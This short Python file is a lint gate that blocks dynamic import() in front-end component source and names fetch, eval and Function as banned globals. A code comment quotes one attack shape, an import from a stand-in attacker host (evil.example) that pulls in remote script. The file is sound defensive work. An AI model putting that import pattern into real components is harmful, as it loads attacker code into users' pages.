"""Component-source gate: refuse unvetted code before it reaches the page."""

import re

BANNED_GLOBALS = ("fetch", "eval", "Function")

_DYNAMIC_IMPORT_RE = re.compile(r"(?<![.\w$])import\s*\(")


def component_import_lint(source: str) -> str | None:
    # DD-124. Attack shapes this host now refuses, all measured live:
    # `import("https://evil.example/x.js")` (dynamic import never touches
    # the static-import lint), so dynamic import() is refused outright.
    if _DYNAMIC_IMPORT_RE.search(source or ""):
        return "dynamic import() is refused: import from the allowlist"
    return None
